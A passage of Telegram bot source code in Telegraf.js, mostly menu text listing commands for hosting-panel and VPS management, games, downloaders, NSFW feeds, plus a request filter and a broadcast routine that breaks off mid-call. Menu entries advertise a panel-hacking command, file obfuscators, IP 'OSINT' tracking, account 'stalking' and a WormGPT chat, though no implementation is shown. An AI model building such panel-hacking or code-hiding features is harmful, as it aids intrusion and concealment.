<b>-# /delpanelV3 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 �𝖲𝗋𝗏</b>
<b>-# /deluserV3 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖴𝗌𝖾𝗋 𝖲𝗋𝗏</b>`
    },
    {
        callback: "a_V4",
        title: "𝖢𝗉𝖺𝗇𝖾𝗅 𝖵𝟦",
        commands: `<b>-# /cpanelV4 » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /cadminV4 » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /deladminpV4 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /delpanelV4 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /deluserV4 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖴𝗌𝖾𝗋 𝖲𝗋𝗏</b>`
    },
    {
        callback: "a_V5",
        title: "𝖢𝗉𝖺𝗇𝖾𝗅 𝖵𝟧",
        commands: `<b>-# /cpanelV5 » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /cadminV5 » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /deladminpV5 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /delpanelV5 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /deluserV5 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖴𝗌𝖾𝗋 𝖲𝗋𝗏</b>`
    }
];

cpanelVersions.forEach(version => {
    bot.action(version.callback, async (ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';

        const keyboard = [
            [
                { text: "Back To Menu", callback_data: "cpanel" }
            ],
            [
                { text: "Contact Owner", url: "https://t.me/ReyValdz" },
                { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
            ]
        ];

        await editMenuMessageWithPhoto(
            ctx,
            menuimage(),
            `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>Version 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 ${version.title}</b></blockquote>
${version.commands}

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
            { reply_markup: { inline_keyboard: keyboard } }
        );
    });
});

bot.action("protect", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "8 - 16", callback_data: "nextprotact" }
        ],
        [
            { text: "Back To Menu", callback_data: "BackToMenu" },
            { text: "🔄 Uninstall Protect", callback_data: "uninstallprotect" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>𝖵𝖾𝗋𝗌𝗂𝗈𝗇 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝖨𝗇𝗌𝗍𝖺𝗅𝗅 𝖯𝗋𝗈𝗍𝖾𝖼𝗍</b></blockquote>
<b>-# /installprotect1 » Install protection 1</b>
<b>-# /installprotect2 » Install protection 2</b>
<b>-# /installprotect3 » Install protection 3</b>
<b>-# /installprotect4 » Install protection 4</b>
<b>-# /installprotect5 » Install protection 5</b>
<b>-# /installprotect6 » Install protection 6</b>
<b>-# /installprotect7 » Install protection 7</b>

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

bot.action("nextprotact", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "⬅️ 𝖯𝗋𝗂𝗏", callback_data: "protect" },
            { text: "Back To Menu", callback_data: "BackToMenu" }
        ],
        [
            { text: "Contact Owner", url: "https://t.me/ReyValdz" },
            { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>𝖵𝖾𝗋𝗌𝗂𝗈𝗇 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝖨𝗇𝗌𝗍𝖺𝗅𝗅 𝖯𝗋𝗈𝗍𝖾𝖼𝗍</b></blockquote>
<b>-# /installprotect8 » Install protection 8</b>
<b>-# /installprotect9 » Install protection 9</b>
<b>-# /installprotect10 » Install protection 10</b>
<b>-# /installprotect11 » Install protection 11</b>
<b>-# /installprotect12 » Install protection 12</b>
<b>-# /installprotect13 » Install protection 13</b>
<b>-# /installprotect14 » Install protection 14</b>
<b>-# /installprotect15 » Install protection 15</b>
<b>-# /installprotect16 » Install protection 16</b>
<b>-# /installprotectall » Install all protections</b>

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

bot.action("uninstallprotect", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "8 - 16", callback_data: "nextunprotact" }
        ],
        [
            { text: "Back To Menu", callback_data: "BackToMenu" },
            { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>𝖵𝖾𝗋𝗌𝗂𝗈𝗇 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝖴𝗇𝗂𝗇𝗌𝗍𝖺𝗅𝗅 𝖯𝗋𝗈𝗍𝖾𝖼𝗍</b></blockquote>
<b>-# /uninstallprotect1 » Uninstall protection 1</b>
<b>-# /uninstallprotect2 » Uninstall protection 2</b>
<b>-# /uninstallprotect3 » Uninstall protection 3</b>
<b>-# /uninstallprotect4 » Uninstall protection 4</b>
<b>-# /uninstallprotect5 » Uninstall protection 5</b>
<b>-# /uninstallprotect6 » Uninstall protection 6</b>
<b>-# /uninstallprotect7 » Uninstall protection 7</b>

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

// Next Uninstall Protect
bot.action("nextunprotact", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "⬅️ 𝖯𝗋𝗂𝗏", callback_data: "uninstallprotect" },
            { text: "Back To Menu", callback_data: "BackToMenu" }
        ],
        [
            { text: "Contact Owner", url: "https://t.me/ReyValdz" },
            { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>𝖵𝖾𝗋𝗌𝗂𝗈𝗇 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝖴𝗇𝗂𝗇𝗌𝗍𝖺𝗅𝗅 𝖯𝗋𝗈𝗍𝖾𝖼𝗍</b></blockquote>
<b>-# /uninstallprotect8 » Uninstall protection 8</b>
<b>-# /uninstallprotect9 » Uninstall protection 9</b>
<b>-# /uninstallprotect10 » Uninstall protection 10</b>
<b>-# /uninstallprotect11 » Uninstall protection 11</b>
<b>-# /uninstallprotect12 » Uninstall protection 12</b>
<b>-# /uninstallprotect13 » Uninstall protection 13</b>
<b>-# /uninstallprotect14 » Uninstall protection 14</b>
<b>-# /uninstallprotect15 » Uninstall protection 15</b>
<b>-# /uninstallprotect16 » Uninstall protection 16</b>
<b>-# /uninstallprotectall » Uninstall all protections</b>

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

bot.action("install", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "𝖨𝗇𝗌𝗍𝖺𝗅𝗅 𝗍𝗁𝖾𝗆𝖾", callback_data: "temaa" },
            { text: "Back To Menu", callback_data: "BackToMenu" }
        ],
        [
            { text: "Contact Owner", url: "https://t.me/ReyValdz" },
            { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>𝖵𝖾𝗋𝗌𝗂𝗈𝗇 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝖨𝗇𝗌𝗍𝖺𝗅𝗅</b></blockquote>
<b>-# /installpanel » 𝖨𝗇𝗌𝗍𝖺𝗅𝖺𝗌𝗂 𝖯𝖺𝗇𝖾𝗅</b>
<b>-# /startwings » 𝖲𝗍𝖺𝗋𝗍 𝖶𝗂𝗇𝗀𝗌</b>
<b>-# /installwings » 𝖨𝗇𝗌𝗍𝖺𝗅𝗅 𝖶𝗂𝗇𝗀𝗌</b>
<b>-# /uninstallwings » 𝖴𝗇𝗂𝗇𝗌𝗍𝖺𝗅𝗅 𝖶𝗂𝗇𝗀𝗌</b>
<b>-# /hbpanel » 𝖧𝖺𝖼𝗄 𝗄𝖾𝗆𝖻𝖺𝗅𝗂 𝖯𝖺𝗇𝖾𝗅</b>
<b>-# /gantipwvps » Change VPS password</b>
<b>-# /hostname » 𝖢𝗁𝖺𝗇𝗀𝖾 𝖵𝖯𝖲 𝖧𝗈𝗌𝗍𝗇𝖺𝗆𝖾</b>
<b>-# /cleardns » Clear domain DNS</b>
<b>-# /listsubdo » Domain list</b>
<b>-# /cekip » 𝖼𝗁𝖾𝖼𝗄 𝗐𝖾𝖻𝗌𝗂𝗍𝖾 𝖨𝖯</b>
<b>-# /subdomain » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖣𝗈𝗆𝖺𝗂𝗇</b>

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

bot.action("temaa", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "⬅️ 𝖯𝗋𝗂𝗏", callback_data: "install" },
            { text: "Back To Menu", callback_data: "BackToMenu" }
        ],
        [
            { text: "Contact Owner", url: "https://t.me/ReyValdz" },
            { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>𝖵𝖾𝗋𝗌𝗂𝗈𝗇 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝖨𝗇𝗌𝗍𝖺𝗅𝗅 Theme</b></blockquote>
<b>-# /uninstalltema</b> » Uninstall all themes and restore default
<b>-# /installwallpaper</b> » Install wallpaper theme with custom backgrounds
<b>-# /installbilling</b> » Install billing/transaction theme for payment systems
<b>-# /installnightcore</b> » Install Nightcore theme with dark blue aesthetics
<b>-# /installnoobe</b> » Install Noobe theme with modern minimalist design
<b>-# /installfrostcore</b> » Install Frostcore theme with icy/snow effects
<b>-# /installblueprint</b> » Install Blueprint theme with technical blueprints design
<b>-# /installtemareviactyl</b> » Install Reviactyl theme with futuristic neon elements

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

bot.action("Order", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "🌐 𝖡𝗎𝗒 A𝖽𝗆𝗂𝗇 P𝖺𝗇𝖾𝗅", callback_data: "buyadp" },
            { text: "🖥️ 𝖡𝗎𝗒 𝖱𝖾𝗌𝖾𝗅𝗅𝖾𝗋 P𝖺𝗇𝖾𝗅", callback_data: "buyreseller" }
        ],
        [
            { text: "🔖 𝖡𝗎𝗒 𝖵𝗉𝗌 𝖣𝗂𝗀𝗂𝗍𝖺𝗅 𝖮𝖼𝖾𝖺𝗇", callback_data: "buyvps" }
        ], 
        [
            { text: "📂 𝖡𝗎𝗒 𝖲𝖼𝗋𝗂𝗉𝗍", callback_data: "buyscript" },
            { text: "🌐 𝖡𝗎𝗒 𝖯𝖺𝗇𝖾𝗅", callback_data: "buypanel" }
        ], 
        [
            { text: "Back To Menu", callback_data: "BackToMenu" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>👋🏻 <b>Pilih Kategori Produk</b>
Silakan jelajahi daftar layanan terbaik kami.

[ 🛒 <b>𝗠𝗘𝗡𝗨 𝗟𝗔𝗬𝗔𝗡𝗔𝗡</b> ]
➥ ⚡ 𝗣𝗿𝗼𝘀𝗲𝘀 : Serba Otomatis
➥ 🛡️ 𝗚𝗮𝗿𝗮𝗻𝘀𝗶 : Terjamin Aman

━━━━━━━━━━━━━━━━━━━━━━━
Klik tombol untuk membeli produk.</blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

/// ---- all other menus ---- ///
const menuTemplates = [
    {
        callback: "Game",
        title: "𝖦𝖺𝗆𝖾",
        commands: `<b>-# /tekateki</b> » Play riddle game
<b>-# /tebakpemainbola</b> » Guess football player from clues
<b>-# /tebakkata</b> » Guess word from clues
<b>-# /tebakheroml</b> » Guess Mobile Legends hero
<b>-# /family100</b> » Family 100 game
<b>-# /susunkata</b> » Rearrange scrambled words
<b>-# /caklontong</b> » Cak Lontong quiz game
<b>-# /asahotak</b> » Brain teaser game
<b>-# /tebakangka</b> » Guess number between 1-10`
    },
    {
        callback: "Cvps",
        title: "Cvps",
        commands: `<b>-# /cvps » Create DigitalOcean VPS</b>
<b>-# /sisadroplet » Check remaining droplets in DO account</b>
<b>-# /listdroplet » List all droplets in DO account</b>
<b>-# /deldroplet » Delete droplet</b>
<b>-# /rebuild » Rebuild droplet with different OS</b>
<b>-# /restartvps » Restart droplet</b>
<b>-# /startvps » Start  droplet</b>
<b>-# /stopvps » Stop droplet</b>`
    },
    {
        callback: "Jasher",
        title: "𝖩𝖺𝗌𝗁𝖾𝗋",
        commands: `<b>-# /share » 𝖲𝗁𝖺𝗋𝖾 𝖯𝖾𝗌𝖺𝗇</b>`
    },
    {
        callback: "Tools",
        title: "𝖳𝗈𝗈𝗅𝗌",
        commands: `<b>-# /trackip » Track IP address</b>
<b>-# /osintip » Track IP address And location</b>
<b>-# /cekfunc » 𝖢𝗁𝖾𝖼𝗄 𝖤𝗋𝗋𝗈𝗋 𝖢𝗈𝖽𝖾 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇</b>
<b>-# /cekeror » 𝖢𝗁𝖾𝖼𝗄 𝖤𝗋𝗋𝗈𝗋 𝖢𝗈𝖽𝖾</b>
<b>-# /siapakah » Who is the ugliest</b>
<b>-# /cekkhodam » Check guardian spirit</b>
<b>-# /cekkontol » Check size</b>
<b>-# /jarakkota » Check City distance</b>`
    },
    {
        callback: "Download",
        title: "𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽",
        commands: `<b>-# /spotify » Download Spotify audio</b>
<b>-# /tiktok » Download TikTok video</b>
<b>-# /mediafire » Download MediaFire file</b>
<b>-# /ig » Download Instagram content</b>
<b>-# /videy » Download Videy Video</b>
<b>-# /capcut » Download Capcut Video</b>`
    },
    {
        callback: "Grup",
        title: "𝖦𝗋𝗈𝗎𝗉",
        commands: `<b>-# /antilink » Anti group link</b>
<b>-# /pin » Pin message in group</b>
<b>-# /unpin » Remove the pin message in group</b>
<b>-# /promote » Promote member to admin</b>
<b>-# /demote » Remove admin</b>
<b>-# /filter » Add filter to group</b>
<b>-# /mute » Mute member</b>
<b>-# /unmute » Unmute member</b>`
    },
    {
        callback: "Canva",
        title: "𝖢𝖺𝗇𝗏𝖺",
        commands: `<b>-# /meme » Create meme</b>
<b>-# /nulis » Handwriting text</b>
<b>-# /qc » Create quote</b>
<b>-# /lobbyffmax » Create Free Fire lobby</b>
<b>-# /createlogo » Create logo</b>
<b>-# /logoarchive » Logo archive</b>
<b>-# /tofigure » Convert to figure</b>
<b>-# /faketweet » Fake tweet</b>
<b>-# /iqc » 𝖨𝖯𝗁𝗈𝗇𝖾𝗌 quote</b>
<b>-# /qc » Message To Sticker</b>
<b>-# /hd » Making images HD</b>
<b>-# /sticker » Create sticker</b>
<b>-# /brat » Brat text effect</b>
<b>-# /ssweb » 𝖲𝖼𝗋𝖾𝖾𝗇𝗌𝗁𝗈𝗍 𝖶𝖾𝖻𝗌𝗂𝗍𝖾</b>
<b>-# /tte » Message To 𝖲𝗈𝗎𝗇𝖽</b>`
    },
    {
        callback: "Advance",
        title: "𝖠𝖽𝗏𝖺𝗇𝖼𝖾𝖽",
        commands: `<b>-# /bunuh » Kill command</b>
<b>-# /perang » War command</b>
<b>-# /upgrade » Upgrade command</b>
<b>-# /ewe » Ewe command</b>`
    },
    {
        callback: "RandomGrils",
        title: "𝖱𝖺𝗇𝖽𝗈𝗆",
        commands: `<b>-# /nsfwrandom » Random NSFW content</b>
<b>-# /asupan » Random asupan content</b>
<b>-# /cecancosplay » Random cosplay girl</b>
<b>-# /cecanchina » Random Chinese girl</b>
<b>-# /cecanindo » Random Indonesian girl</b>
<b>-# /cecankorea » Random Korean girl</b>
<b>-# /cecanthailand » Random Thai girl</b>
<b>-# /cecanvietnam » Random Vietnamese girl</b>
<b>-# /cecanjapan » Random Japanese girl</b>`
    },
    {
        callback: "Search",
        title: "𝖲𝖾𝖺𝗋𝖼𝗁",
        commands: `<b>-# /play » Play music from YouTube</b>
<b>-# /spotifyplay » Play music from Spotify</b>
<b>-# /tiktoksearch » Search and download TikTok videos</b>
<b>-# /capcutsearch » Search and download Capcut videos</b>
<b>-# /pinterest  » Search and download pinterest Photo</b>
<b>-# /tiktoktobrut  » Search and download TikTok Tobrut videos</b>
<b>-# /tiktokmeme  » Search and download TikTok meme videos</b>`
    },
    {
        callback: "Obf",
        title: "𝖮𝖻𝖿𝗎𝗌𝖼𝖺𝗍𝗂𝗈𝗇",
        commands: `<b>-# /encrypt » Encrypt file</b>
<b>-# /encinvis » Invisible encrypt</b>
<b>-# /encryptpy » Python encrypt</b>
<b>-# /encchina » Chinese encrypt</b>
<b>-# /encrypthtml » HTML encrypt</b>`
    },
    {
        callback: "User",
        title: "𝖴𝗌𝖾𝗋",
        commands: `<b>-# /req » Request feature</b>
<b>-# /info » Check ID</b>
<b>-# /lapor » 𝖡𝗎𝗀 𝗋𝖾𝗉𝗈𝗋𝗍 𝗍𝗈 𝗈𝗐𝗇𝖾𝗋</b>
<b>-# /cekidgroup » Check group ID (@username)</b>
<b>-# /cekidchannel » Check channel ID (@username)</b>
<b>-# /ceklimit » Check limit</b>`
    },
    {
        callback: "stalk",
        title: "𝖲𝗍𝖺𝗅𝗄",
        commands: `<b>-# /ffstalk » 𝖥𝗋𝖾𝖾 𝖥𝗂𝗋𝖾 𝖲𝗍𝖺𝗅𝗄</b>
<b>-# /mlstalk » 𝖬𝗈𝖻𝗂𝗅 𝖫𝖾𝗀𝖾𝗇𝖽 𝖲𝗍𝖺𝗅𝗄</b>
<b>-# /githubstalk » 𝖦𝗂𝗍𝖧𝗎𝖻 𝖲𝗍𝖺𝗅𝗄</b>
<b>-# /tiktokstalk  » 𝖳𝗂𝗄𝗍𝗈𝗄 𝖲𝗍𝖺𝗅𝗄</b>`
    },
    {
        callback: "Ai",
        title: "𝖠𝖨",
        commands: `<b>-# /autoai » 𝖠𝗎𝗍𝗈 𝖠𝖨 𝖢𝗁𝖺𝗍</b>
<b>-# /ai » GPT AI chat</b>
<b>-# /wormgpt » WormGPT AI chat</b>
<b>-# /blink » 𝖢𝗋𝖾𝖺𝗍𝗂𝗇𝗀 𝗉𝗁𝗈𝗍𝗈𝗌 𝗐𝗂𝗍𝗁 𝖠𝖨</b>`
    },
    {
        callback: "berita",
        title: "𝖡𝖾𝗋𝗂𝗍𝖺",
        commands: `<b>-# /cekcuaca » Check the Weather</b>
<b>-# /kompas » Check Kompas news</b>
<b>-# /berita » Check news</b>`
    }
];

/// ----- Register all menu ----- ///
menuTemplates.forEach(menu => {
    createSimpleMenuHandler(menu.callback, menu.title, menu.commands);
});

// -------------------- [ Command : Request ] -------------------- \\
bot.command("req", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply("❗ Gunakan: /req <pesan kamu>");

    const badWords = [
        "anjing", "bangsat", "kontol", "memek", "ngentot",
        "babi", "tolol", "goblok", "fuck", "shit", "bokep", "bkp", "porno", "porn"
    ];

    const promoPattern =
        /(https?:\/\/|t\.me\/|telegram\.me|wa\.me\/|whatsapp|joinchat|promo|join|subscribe)/i;
    const ownerTagPattern =
        /(owner\s*@\w+|admin\s*@\w+|hubungi\s*@\w+|contact\s*@\w+|@[\w\d_]{5,})/i;
    const whitelist = [
        "@ReyValdz",  // owner
        "@VyxxzAssistenBOT" // bot
    ];

    const lowerText = text.toLowerCase();

    if (badWords.some(w => lowerText.includes(w))) {
        return ctx.reply("❌ Request ditolak: kata tidak pantas terdeteksi.");
    }

    if (promoPattern.test(lowerText)) {
        return ctx.reply("❌ Request ditolak: dilarang promosi / share link.");
    }

    if (ownerTagPattern.test(lowerText)) {
        if (!whitelist.some(u => lowerText.includes(u))) {
            return ctx.reply("❌ Request ditolak: dilarang menyebut owner / username.");
        }
    }

    const user = ctx.from;
    const messageCaption = `
<blockquote>📩 <b>𝖱𝖾𝗊𝗎𝖾𝗌𝗍 𝖻𝖺𝗋𝗎 𝖣𝖺𝗋𝗂 𝖴𝗌𝖾𝗋</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Nama:</b> ${user.first_name || "-"}
🧩 <b>Username:</b> ${user.username ? "@" + user.username : "-"}
🆔 <b>ID:</b> <code>${user.id}</code>
💬 <b>Pesan:</b> ${text}
━━━━━━━━━━━━━━━━━━</blockquote>`;

    const buttons = {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Contact Owner", url: "https://t.me/ReyValdz", style: "success" },
                    { text: "𝖡𝗈𝗍𝗌", url: "https://t.me/VyxxzAssistenBOT", style: "success" }
                ],
                [
                    { text: "𝖢𝗁𝖺𝗇𝗇𝖾𝗅 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", url: "https://t.me/Xtrol_Team", style: "success" }
                ]
            ]
        }
    };

    try {
        const photos = await ctx.telegram.getUserProfilePhotos(user.id, 0, 1);
        let photoId = null;

        if (photos.total_count > 0) {
            photoId = photos.photos[0][0].file_id;
        }

        if (photoId) {
            await ctx.telegram.sendPhoto(OWNER_ID, photoId, {
                caption: messageCaption,
                ...buttons
            });

            await ctx.telegram.sendPhoto(Channel_ID, photoId, {
                caption: messageCaption,
                ...buttons
            });
        } else {
            await ctx.telegram.sendMessage(OWNER_ID, messageCaption, buttons);
            await ctx.telegram.sendMessage(Channel_ID, messageCaption, buttons);
        }

        await ctx.reply("✅ Request kamu sudah dikirim ke owner & channel!");
    } catch (err) {
        console.error("Gagal kirim request:", err.message);
        ctx.reply("❌ Gagal mengirim request. Coba lagi nanti.");
    }
});

// -------------------- [ Command : broadcast ] -------------------- \\
bot.command("broadcast", async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id.toString();

  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg) return ctx.reply("⚠️ Raply pesan yang ingin dibroadcast.");

  if (broadcastLock.has(userId)) {
    return ctx.reply("⏳ Masih ada broadcast yang berjalan, tunggu selesai dulu.");
  }

  const users = loadAllUsers();
  if (!users || users.length === 0) return ctx.reply("❌ Belum ada user di database!");

  const targetUsers = users
    .filter(u => u && u.id && /^\d+$/.test(u.id.toString()) && u.id.toString() !== userId)
    .map(u => u.id.toString());

  if (targetUsers.length === 0) return ctx.reply("❌ Tidak ada user target yang valid!");

  broadcastLock.set(userId, true);
  const progressMsg = await ctx.reply(
    `<blockquote>📤 <b>Memulai Broadcast.</b>\n\n📊 <b>Total User:</b> ${formatNumber(targetUsers.length)}\n✅ <b>Sukses:</b> 0\n❌ <b>Gagal:</b> 0\n📈 <b>Progress:</b> 0%</blockquote>`,
    { parse_mode: "HTML" }
  );

  const BATCH_SIZE = 20;  // kirim per batch ( sesuaikan )
  const DELAY_BETWEEN_BATCH = 800;  // ms jeda antar batch
  const SEND_TIMEOUT_MS = 7000;  // timeout tiap kirim ( ms )

  let sukses = 0;
  let gagal = 0;
  const startTime = Date.now();

  const forwardMessageWithTimeout = (targetId) => {
    return new Promise(async (resolve) => {
      let settled = false;
      const timer = setTimeout(() => {
        if (!settled) {
          settled = true;
          resolve(false); // timeout
        }
      }, SEND_TIMEOUT_MS);

      try {
        await ctx.telegram.forwardMessage(targetId, chatId, replyMsg.message_id);
        if (!settled) {
          settled = true;
          clearTimeout(timer);
          resolve(true);
        }
      } catch (err) {
        if (!settled) {
          settled = true;
          clearTimeout(timer);
          const msg = (err && err.message) ? err.message.toLowerCase() : "";
          if (!msg.includes("bot was blocked") && !msg.includes("user is deactivated") && !msg.includes("chat not found")) {
            console.log(chalk.yellow(`⚠️ Gagal kirim broadcast ke ${targetId}: ${err.message || err}`));
          }
          resolve(false);
        }
      }
    });
  };

  try {
    for (let i = 0; i < targetUsers.length; i += BATCH_SIZE) {
      const batch = targetUsers.slice(i, i + BATCH_SIZE);
      const promises = batch.map(t => forwardMessageWithTimeout(t));
      const results = await Promise.allSettled(promises);

      results.forEach(r => {
        if (r.status === "fulfilled" && r.value) sukses++;
        else gagal++;
      });

      const currentIndex = Math.min(i + BATCH_SIZE, targetUsers.length);
      const progressPercent = Math.round((currentIndex / targetUsers.length) * 100);
      const elapsedTime = Math.floor((Date.now() - startTime) / 1000);

      try {
        await ctx.telegram.editMessageText(
          chatId,
          progressMsg.message_id,
          undefined,
